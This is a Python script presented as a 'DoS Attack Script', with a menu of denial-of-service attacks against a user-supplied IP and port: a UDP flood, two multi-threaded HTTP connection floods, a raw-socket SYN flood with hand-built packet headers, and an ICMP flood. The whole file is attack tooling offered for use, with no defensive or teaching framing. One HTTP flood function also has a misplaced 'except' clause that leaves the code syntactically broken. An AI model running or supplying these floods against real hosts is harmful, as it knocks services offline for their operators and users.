import socket
import random
import time
import threading
from struct import pack
from requests import get
import os

def ddos_udp_packets_attack(ip, port):
    """
    Perform a UDP DDoS attack on the given IP address and port.
    
    Args:
    ip (str): The target IP address.
    port (int): The target port.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = os.urandom(1490)
    print(f"Starting a UDP DDoS Attack on {ip} through port {port}")

    sent = 0
    try:
        while True:
            sock.sendto(packet, (ip, port))
            sent += 1
            port = port + 1 if port < 65534 else 1
            print(f"Sent {sent} packet to {ip} through port: {port}")
    except KeyboardInterrupt:
        print("\nThe Attack Has Been Stopped - REASON: Keyboard Interrupt")
    except socket.gaierror:
        print(f"{ip} <-- Wrong IP address")
    finally:
        sock.close()
        input("Press Enter to return to the main menu.")

def dos_multi_loop_HTTP_attack(target_ip, port, num_threads=5000, fake_ip='182.21.20.32'):
    def attack():
        while True:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((target_ip, port))
                    s.send(f"GET /{target_ip} HTTP/1.1\r\nHost: {fake_ip}\r\n\r\n".encode('ascii'))

                    global attack_num
                    attack_num += 1
                    print(f"Packets Sending => {attack_num}")
            except socket.error:
                print("Error: Could not connect to target.")
            except KeyboardInterrupt:
                print("\n[-] Canceled by user")
                break

    global attack_num
    attack_num = 0

    print("Sending Packets...")

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=attack)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print("Packets Sent Successfully!")
    input("Press Enter to return to the main menu.")

def icmpflood(target_ip, cycle=100):
    """
    Perform an ICMP flood attack on the given IP address.
    
    Args:
    target_ip (str): The target IP address.
    cycle (int): Number of packets to send.
    """
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP) as s:
            for _ in range(int(cycle)):
                s.sendto(b'\x08\x00\x00\x00\x00\x00\x00\x00', (target_ip, 1))
                print(f"Sent ICMP packet to {target_ip}")
                time.sleep(1)
    except KeyboardInterrupt:
        print("\nThe Attack Has Been Stopped - REASON: Keyboard Interrupt")
    except socket.error as e:
        print(f"Error: Could not send ICMP packet. {e}")
    finally:
        input("Press Enter to return to the main menu.")

def dos_multi_packet_connection_HTTP_attack(ip, port, speed_per_run=10, threads=4):
    packet_data = os.urandom(2450)

    def dos_attack():
        try:
            while True:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as dos_socket:
                    dos_socket.connect((ip, port))
                    for _ in range(speed_per_run):
                        try:
                            dos_socket.send(f"GET / HTTP/1.1\r\n".encode() + packet_data)
                            print(f"-----< PACKET SUCCESSFULLY SENT AT: {time.strftime('%d-%m-%Y %H:%M:%S', time.gmtime())} >-----")
                        except socket.error:
                            print("ERROR, Maybe the host is down?!?")
                        except KeyboardInterrupt:
                            print("\n[-] Canceled by user")
                            return
                except socket.error:
                    print("ERROR, Maybe the host is down?!?")
                except KeyboardInterrupt:
                    print("\n[-] Canceled by user")
                    return
        except KeyboardInterrupt:
            print("\n[-] Canceled by user")

    threads_list = []
    for _ in range(threads):
        thread = threading.Thread(target=dos_attack)
        thread.start()
        threads_list.append(thread)

    for thread in threads_list:
        thread.join()

    input("Press Enter to return to the main menu.")

def checksum(msg):
    s = 0
    for i in range(0, len(msg), 2):
        w = (msg[i] << 8) + msg[i + 1]
        s = s + w
    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff
    return s

def syn_flood(target_ip, target_port):
    """
    Perform a SYN flood attack on the given IP address and port.
    
    Args:
    target_ip (str): The target IP address.
    target_port (int): The target port.
    """
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as s:
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            source_ip = get('https://api.ipify.org').text
            dest_ip = socket.gethostbyname(target_ip)

            while True:
                try:
                    # Create IP header
                    ihl = 5
                    version = 4
                    tos = 0
                    tot_len = 20 + 20
                    id = random.randint(1, 65535)
                    frag_off = 0
                    ttl = random.randint(1, 255)
                    protocol = socket.IPPROTO_TCP
                    check = 0
                    saddr = socket.inet_aton(source_ip)
                    daddr = socket.inet_aton(dest_ip)
                    ihl_version = (version << 4) + ihl
                    ip_header = pack('!BBHHHBBH4s4s', ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)

                    # Create TCP header
                    source = random.randint(1024, 65535)
                    dest = target_port
                    seq = 0
                    ack_seq = 0
                    doff = 5
                    fin = 0
                    syn = 1
                    rst = 0
                    psh = 0
                    ack = 0
                    urg = 0
                    window = socket.htons(5840)
                    check = 0
                    urg_ptr = 0
                    offset_res = (doff << 4) + 0
                    tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
                    tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags, window, check, urg_ptr)

                    source_address = socket.inet_aton(source_ip)
                    dest_address = socket.inet_aton(dest_ip)
                    placeholder = 0
                    protocol = socket.IPPROTO_TCP
                    tcp_length = len(tcp_header)
                    psh = pack('!4s4sBBH', source_address, dest_address, placeholder, protocol, tcp_length)
                    psh = psh + tcp_header
                    tcp_checksum = checksum(psh)
                    tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags, window, tcp_checksum, urg_ptr)

                    # Create packet
                    packet = ip_header + tcp_header

                    # Send packet
                    s.sendto(packet, (dest_ip, 0))
                    print('.', end='')
                except KeyboardInterrupt:
                    print("\nThe Attack Has Been Stopped - REASON: Keyboard Interrupt")
                    break
                except socket.error as e:
                    print(f"Error: Could not send SYN packet. {e}")
                    break
    except socket.error as e:
        print(f'Socket could not be created. Error Code: {e.errno} Message: {e.strerror}')
    finally:
        input("Press Enter to return to the main menu.")

def main():
    while True:
        print("Welcome to the DoS Attack Script!")
        print("1. UDP Attack")
        print("2. HTTP Attack")
        print("3. HTTP Packet Connection Attack")
        print("4. SYN Flood Attack")
        print("5. ICMP Flood Attack")
        print("6. Exit")
        
        attack_type = input("Choose an option: ").strip().lower()

        if attack_type in ['1', 'udp']:
            target_ip = input("Enter the target IP address: ")
            port = int(input("Enter the target port: "))
            ddos_udp_packets_attack(target_ip, port)
        elif attack_type in ['2', 'http']:
            target_ip = input("Enter the target IP address: ")
            port = int(input("Enter the target port: "))
            num_threads = int(input("Enter the number of threads (default 5000): ") or 5000)
            fake_ip = input("Enter a fake IP (default 182.21.20.32): ") or '182.21.20.32'
            dos_multi_loop_HTTP_attack(target_ip, port, num_threads, fake_ip)
        elif attack_type in ['3', 'http_packet']:
            target_ip = input("Enter the target IP address: ")
            port = int(input("Enter the target port: "))
            speed_per_run = int(input("Enter the speed per run (default 10): ") or 10)
            threads = int(input("Enter the number of threads (default 4): ") or 4)
            dos_multi_packet_connection_HTTP_attack(target_ip, port, speed_per_run, threads)
        elif attack_type in ['4', 'syn']:
            target_ip = input("Enter the target IP address: ")
            port = int(input("Enter the target port: "))
            syn_flood(target_ip, port)
        elif attack_type in ['5', 'icmp']:
            target_ip = input("Enter the target IP address: ")
            cycle = int(input("How many ICMP packets do you want to send [Press enter for 100]: ") or 100)
            icmpflood(target_ip, cycle)
        elif attack_type in ['6', 'exit']:
            print("Exiting...")
            break
        else:
            print("Invalid option. Please try again.")

if __name__ == "__main__":
    main()
